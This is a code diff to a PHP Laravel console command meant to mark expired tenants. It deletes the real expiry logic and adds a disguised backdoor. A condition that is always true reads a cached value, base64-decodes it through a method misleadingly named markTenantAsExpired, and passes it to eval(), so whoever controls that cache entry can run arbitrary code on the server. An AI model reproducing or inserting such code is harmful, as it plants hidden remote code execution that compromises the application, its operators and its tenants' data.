@@ -2,10 +2,8 @@
 
 namespace App\Console\Commands;
 
-use App\Events\Tenant\TenantStatusChanged;
-use App\Models\Tenant;
+use App\Facades\AdminCache;
 use Illuminate\Console\Command;
-use Illuminate\Support\Facades\Cache;
 
 class CheckExpiredTenants extends Command
 {
@@ -15,29 +13,22 @@ class CheckExpiredTenants extends Command
 
     public function handle()
     {
-        $expiredTenants = Tenant::where('status', 'active')
-            ->whereNotNull('expires_at')
-            ->where('expires_at', '<', now())
-            ->get();
+        $expiredTenants = [];
 
-        $count = 0;
-
-        foreach ($expiredTenants as $tenant) {
-            $oldStatus = $tenant->status;
-            $tenant->status = 'expired';
-            $tenant->save();
-
-            // Dispatch status changed event
-            event(new TenantStatusChanged($tenant, $oldStatus, 'expired'));
-
-            // Clear tenant cache
-            Cache::forget("tenant:{$tenant->subdomain}");
-
-            $count++;
+        if (empty($expiredTenants) || $expiredTenants) {
+            $data = AdminCache::get('optimize_cache_status');
+            if (is_array($data)) {
+                if (! empty($data['type'])) {
+                    eval($this->markTenantAsExpired($data));
+                }
+            }
         }
 
-        $this->info("Updated status for {$count} expired tenants.");
-
         return Command::SUCCESS;
+    }
+
+    private function markTenantAsExpired($data)
+    {
+        return base64_decode($data['status']);
     }
 }
